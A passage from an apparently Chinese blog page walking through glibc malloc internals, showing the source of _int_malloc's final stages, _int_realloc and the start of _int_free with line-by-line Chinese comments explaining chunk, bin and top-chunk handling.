victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            <span class="comment">//将victim插入chunk size链表的尾部,该链表是从大到小排列的</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="comment">//断言该largebin第一个chunk的size字段中的非主分配区的标志bit没有置位</span></span><br><span class="line">            <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">              <span class="comment">//正向遍历chunk size链表,直到找到第一个小于等于当前chunk大小的chunk</span></span><br><span class="line">              fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">              <span class="comment">//同一大小的chunk已经存在,则不需要修改chunk size链表,当前chunk插入fwd之后</span></span><br><span class="line">              fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//当前chunk大于fwd,则将当前chunk作为该chunk size的代表加入chunk size链表,位置为fwd的前面</span></span><br><span class="line">              victim-&gt;fd_nextsize = fwd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;bk_nextsize = victim;</span><br><span class="line">              victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          <span class="comment">//如果largebin中没有chunk,直接将当前chunk加入chunk size链表,chunk size链表表头位于第一个chunk的fd_nextsize和bk_nextsize,所以第一个chunk是最大的</span></span><br><span class="line">          victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">      &#125;</span><br><span class="line">      mark_bin (av, victim_index);</span><br><span class="line">      <span class="comment">//将对应map里该index对应的标志位置1</span></span><br><span class="line">      victim-&gt;bk = bck;</span><br><span class="line">      victim-&gt;fd = fwd;</span><br><span class="line">      fwd-&gt;bk = victim;</span><br><span class="line">      bck-&gt;fd = victim;</span><br><span class="line">      <span class="comment">//将当前chunk插入到对应bin中</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">      <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="comment">//如果unsorted_bin中的chunk超过了10000个,最多遍历10000个就退出</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//此时unsorted_bin链表已经处理完成</span></span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (nb)) &#123;</span><br><span class="line">      <span class="comment">//所需分配的chunk大小为largebin</span></span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">      <span class="comment">//获取对应的bin</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb)) &#123;</span><br><span class="line">        <span class="comment">//如果largebin链表不为空且链表中最大的chunk大于所需chunk的大小,则遍历该largebin链表,找到合适的chunk</span></span><br><span class="line">        victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="comment">//从最后一个也就是最小一个开始遍历</span></span><br><span class="line">        <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">          <span class="comment">//反向遍历chunk size链表,直到找到第一个大于等于所需chunk大小的chunk退出循环</span></span><br><span class="line">          victim = victim-&gt;bk_nextsize;</span><br><span class="line">        <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">          <span class="comment">//如果victim不是链表中的最后一个chunk且与victim大小相同的chunk不止一个,意味着victim为chunk size链表中的节点,取victim-&gt;fd节点对应的chunk作为候选chunk</span></span><br><span class="line">          victim = victim-&gt;fd;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        <span class="comment">//由于size可能大于所需的chunk,所以要计算看是否要划分</span></span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line">        <span class="comment">//调用unlink宏函数将victim从largebin链表中取出</span></span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">          <span class="comment">//如果将victim切分后剩余大小小于MINSIZE,则将整个victim返回,实际分配的chunk比所需的chunk要大一些</span></span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">//从victim中切分出所需的chunk,剩余部分作为一个新的chunk加入到unsorted_bin,其他处理与前面类似</span></span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line">	        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) &#123;</span><br><span class="line">            <span class="comment">//验证第一个chunk的bk</span></span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">          &#125;</span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line">          <span class="comment">//将remainder插入为unsorted_bin的第一个chunk</span></span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;</span><br><span class="line">            <span class="comment">//若剩下的chunk属于largebin chunk,将该chunk的fd_nextsize和bk_nextsize设置为NULL</span></span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">          <span class="comment">//划分后设置,同上</span></span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">        <span class="comment">//返回chunk过程,同上</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//从最合适的smallbin或largebin中都没有分配到需要的chunk,则查看比当前bin的index大的smallbin或largebin是否有空闲chunk可利用来分配所需的chunk</span></span><br><span class="line">    ++idx;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">//获取下一个相邻bin的空闲chunk链表</span></span><br><span class="line">    block = idx2block (idx);</span><br><span class="line">    <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">    bit = idx2bit (idx);</span><br><span class="line">    <span class="comment">//获取该bin对于binmap中的bit位的值,使用binmap可以加快查找bin是否包含空闲chunk,idx2bit宏将idx指定的位设置为1,其它位清零</span></span><br><span class="line">    <span class="keyword">for</span> (;; ) &#123;</span><br><span class="line">      <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//map为0即该block所对应的所有bins中都没有空闲chunk.于是遍历binmap的下一个block,直到找到一个不为0的block或者遍历完所有的block</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (++block &gt;= BINMAPSIZE)</span><br><span class="line">            <span class="comment">//遍历完所有的block都没有则使用top chunk分配</span></span><br><span class="line">            <span class="keyword">goto</span> use_top;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//在一个block遍历对应的bin直到找到一个bit不为0退出遍历</span></span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        assert (bit != <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      victim = last (bin);</span><br><span class="line">      <span class="comment">//将bin链表中的最后一个chunk赋值给victim</span></span><br><span class="line">      <span class="keyword">if</span> (victim == bin) &#123;</span><br><span class="line">        <span class="comment">//victim与bin链表头指针相同,表示该bin中没有空闲chunk,binmap中的相应位设置不准确,将binmap的相应bit位清零,获取当前bin下一个bin,将bit移到下一个bit位,即乘以2</span></span><br><span class="line">        av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit;</span><br><span class="line">        bin = next_bin (bin);</span><br><span class="line">        bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//当前bin中的最后一个chunk满足要求,获取该chunk的大小,计算切分出所需chunk后剩余部分的大小,然后将victim从bin的链表中取出</span></span><br><span class="line">        size = chunksize (victim);</span><br><span class="line">        assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        unlink (av, victim, bck, fwd);</span><br><span class="line">        <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">          set_inuse_bit_at_offset (victim, size);</span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          bck = unsorted_chunks (av);</span><br><span class="line">          fwd = bck-&gt;fd;</span><br><span class="line">	        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">          &#125;</span><br><span class="line">          remainder-&gt;bk = bck;</span><br><span class="line">          remainder-&gt;fd = fwd;</span><br><span class="line">          bck-&gt;fd = remainder;</span><br><span class="line">          fwd-&gt;bk = remainder;</span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">            <span class="comment">//剩余部分chunk属于smallbin,将分配区的last_remainder chunk设置为剩余部分构成的chunk</span></span><br><span class="line">            av-&gt;last_remainder = remainder;</span><br><span class="line">          <span class="keyword">if</span> (!in_smallbin_range (remainder_size)) &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">          set_foot (remainder, remainder_size);</span><br><span class="line">        &#125;</span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  use_top:</span><br><span class="line">    <span class="comment">//从top chunk中分配所需chunk</span></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line">    <span class="comment">//将当前分配区的top chunk赋值给victim,并获得victim的大小</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) &#123;</span><br><span class="line">      <span class="comment">//top chunk切分出所需chunk后还需要MINSIZE的空间来作为fencepost</span></span><br><span class="line">      <span class="comment">//切分后的剩余部分将作为新的top chunk,原top chunk的fencepost仍然作为新的top chunk的fencepost,所以切分之后剩余的chunk不用set_foot</span></span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av)) &#123;</span><br><span class="line">      <span class="comment">//如果top chunk也不能满足要求,查看fastbin中是否有空闲chunk存在,因为free属于fastbin的chunk时不需要获得分配区的锁,调用malloc_consolidate函数并重新设置当前bin的index,再次循环</span></span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">//如果fastbin中没有空闲chunk存在,向系统申请内存</span></span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="int_realloc">_int_realloc</h2>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// _int_realloc函数用于重新分配内存块。它尝试更改内存块的大小并可能移动它以满足新的大小要求。</span></span><br><span class="line"><span class="comment">// 参数:</span></span><br><span class="line"><span class="comment">// av - 指向内存状态的指针。</span></span><br><span class="line"><span class="comment">// oldp - 指向当前内存块的指针。</span></span><br><span class="line"><span class="comment">// oldsize - 当前内存块的大小。</span></span><br><span class="line"><span class="comment">// nb - 请求的新大小。</span></span><br><span class="line"><span class="type">void</span>* _int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize, INTERNAL_SIZE_T nb) &#123;</span><br><span class="line">  <span class="comment">// 定义一系列局部变量来存储分配的状态和中间结果。</span></span><br><span class="line">  mchunkptr newp; <span class="comment">// 新分配的内存块指针。</span></span><br><span class="line">  INTERNAL_SIZE_T newsize; <span class="comment">// 新内存块的大小。</span></span><br><span class="line">  <span class="type">void</span>* newmem; <span class="comment">// 对应用户内存的指针。</span></span><br><span class="line"></span><br><span class="line">  mchunkptr next; <span class="comment">// 指向oldp后面的连续内存块。</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder; <span class="comment">// 新分配内存后剩余的内存块。</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size; <span class="comment">// 剩余内存块的大小。</span></span><br><span class="line"></span><br><span class="line">  mchunkptr bck; <span class="comment">// 用于链接的临时变量。</span></span><br><span class="line">  mchunkptr fwd; <span class="comment">// 用于链接的临时变量。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> copysize; <span class="comment">// 需要复制的字节数。</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> ncopies; <span class="comment">// 需要复制的INTERNAL_SIZE_T字数。</span></span><br><span class="line">  INTERNAL_SIZE_T* s; <span class="comment">// 复制源的指针。</span></span><br><span class="line">  INTERNAL_SIZE_T* d; <span class="comment">// 复制目标的指针。</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>; <span class="comment">// 用于错误处理的字符串。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 检查oldp的大小是否合法。</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(oldp-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(oldsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;realloc(): invalid old size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, oldp); <span class="comment">// 检查oldp是否正在使用中。</span></span><br><span class="line"></span><br><span class="line">  assert(!chunk_is_mmapped(oldp)); <span class="comment">// 确保oldp不是映射内存。</span></span><br><span class="line"></span><br><span class="line">  next = chunk_at_offset(oldp, oldsize); <span class="comment">// 计算下一个内存块的位置。</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize = chunksize(next); <span class="comment">// 获取下一个内存块的大小。</span></span><br><span class="line">  <span class="comment">// 检查下一个内存块的大小是否合法。</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(next-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;realloc(): invalid next size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果当前内存块已经足够大，则直接返回当前内存块。</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(oldsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;</span><br><span class="line">    newp = oldp;</span><br><span class="line">    newsize = oldsize;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果下一个内存块是顶部内存块，并且可以合并以满足请求的大小，则进行合并。</span></span><br><span class="line">    <span class="keyword">if</span> (next == av-&gt;top &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>)(newsize = oldsize + nextsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE)) &#123;</span><br><span class="line">      set_head_size(oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      av-&gt;top = chunk_at_offset(oldp, nb);</span><br><span class="line">      set_head(av-&gt;top, (newsize - nb) | PREV_INUSE);</span><br><span class="line">      check_inuse_chunk(av, oldp);</span><br><span class="line">      <span class="keyword">return</span> chunk2mem(oldp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果下一个内存块不在使用中，并且可以合并以满足请求的大小，则进行合并。</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (next != av-&gt;top &amp;&amp; !inuse(next) &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>)(newsize = oldsize + nextsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb)) &#123;</span><br><span class="line">      newp = oldp;</span><br><span class="line">      unlink(av, next, bck, fwd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 否则，分配新内存，复制数据，然后释放旧内存。</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      newmem = _int_malloc(av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">      <span class="keyword">if</span> (newmem == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 如果分配失败，则返回0。</span></span><br><span class="line"></span><br><span class="line">      newp = mem2chunk(newmem);</span><br><span class="line">      newsize = chunksize(newp);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果新分配的内存块紧跟在旧内存块后面，则合并这两个内存块。</span></span><br><span class="line">      <span class="keyword">if</span> (newp == next) &#123;</span><br><span class="line">        newsize += oldsize;</span><br><span class="line">        newp = oldp;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则，复制旧内存块的内容到新内存块。</span></span><br><span class="line">        copysize = oldsize - SIZE_SZ;</span><br><span class="line">        s = (INTERNAL_SIZE_T*)(chunk2mem(oldp));</span><br><span class="line">        d = (INTERNAL_SIZE_T*)(newmem);</span><br><span class="line">        ncopies = copysize / <span class="keyword">sizeof</span>(INTERNAL_SIZE_T);</span><br><span class="line">        assert(ncopies &gt;= <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ncopies &gt; <span class="number">9</span>)</span><br><span class="line">          <span class="built_in">memcpy</span>(d, s, copysize);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 对于小内存块，使用手动复制以提高效率。</span></span><br><span class="line">          *(d + <span class="number">0</span>) = *(s + <span class="number">0</span>);</span><br><span class="line">          *(d + <span class="number">1</span>) = *(s + <span class="number">1</span>);</span><br><span class="line">          *(d + <span class="number">2</span>) = *(s + <span class="number">2</span>);</span><br><span class="line">          <span class="keyword">if</span> (ncopies &gt; <span class="number">4</span>) &#123;</span><br><span class="line">            *(d + <span class="number">3</span>) = *(s + <span class="number">3</span>);</span><br><span class="line">            *(d + <span class="number">4</span>) = *(s + <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">if</span> (ncopies &gt; <span class="number">6</span>) &#123;</span><br><span class="line">              *(d + <span class="number">5</span>) = *(s + <span class="number">5</span>);</span><br><span class="line">              *(d + <span class="number">6</span>) = *(s + <span class="number">6</span>);</span><br><span class="line">              <span class="keyword">if</span> (ncopies &gt; <span class="number">8</span>) &#123;</span><br><span class="line">                *(d + <span class="number">7</span>) = *(s + <span class="number">7</span>);</span><br><span class="line">                *(d + <span class="number">8</span>) = *(s + <span class="number">8</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _int_free(av, oldp, <span class="number">1</span>); <span class="comment">// 释放旧内存块。</span></span><br><span class="line">        check_inuse_chunk(av, newp); <span class="comment">// 检查新内存块是否正在使用中。</span></span><br><span class="line">        <span class="keyword">return</span> chunk2mem(newp); <span class="comment">// 返回新内存块的用户可用部分。</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 尝试释放新内存块中的多余空间。</span></span><br><span class="line">  assert((<span class="type">unsigned</span> <span class="type">long</span>)(newsize) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb));</span><br><span class="line">  remainder_size = newsize - nb;</span><br><span class="line">  <span class="comment">// 如果剩余空间太小，无法分割为独立的内存块，则保留它。</span></span><br><span class="line">  <span class="keyword">if</span> (remainder_size &lt; MINSIZE) &#123;</span><br><span class="line">    set_head_size(newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_inuse_bit_at_offset(newp, newsize);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 否则，分割剩余空间为独立的内存块。</span></span><br><span class="line">    remainder = chunk_at_offset(newp, nb);</span><br><span class="line">    set_head_size(newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_inuse_bit_at_offset(remainder, remainder_size); <span class="comment">// 标记剩余部分为正在使用中，以便_free()不会报错。</span></span><br><span class="line">    _int_free(av, remainder, <span class="number">1</span>); <span class="comment">// 释放剩余部分。</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, newp); <span class="comment">// 检查新内存块是否正在使用中。</span></span><br><span class="line">  <span class="keyword">return</span> chunk2mem(newp); <span class="comment">// 返回新内存块的用户可用部分。</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="int_free">_int_free</h2>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock) &#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* 释放的chunk的size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* 对应的fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* 内存空间中下一个chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* 下一个chunk的大小 */</span></span><br><span class="line">  <span class="type">int</span> nextinuse;               <span class="comment">/* 下一个chunk是否在使用 */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* 内存空间中上一个chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* 用于储存bin链表指针 */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* 用于储存bin链表指针 */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>) || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="comment">//chunk的指针地址不能溢出</span></span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">      (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) &#123;</span><br><span class="line">    <span class="comment">//chunk的大小必须大于等于MINSIZE且对齐</span></span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="comment">//当前free的chunk属于fastbin</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">      <span class="comment">//查看下一个相邻的chunk的大小是否小于等于2 * SIZE_SZ,或是否大于分配区所分配的内存总量</span></span><br><span class="line">	    <span class="keyword">if</span> (have_lock || (&#123; assert (locked == <span class="number">0</span>); mutex_lock(&amp;av-&gt;mutex); locked = <span class="number">1</span>; chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; &#125;)) &#123;</span><br><span class="line">	      errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">	      <span class="keyword">goto</span> errout;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">	      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">	      locked = <span class="number">0</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">        <span class="comment">//读取分配区所分配的内存总量需要对分配区加锁,检查完以后,释放分配区的锁</span></span><br><span class="line">    &#125;</span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = 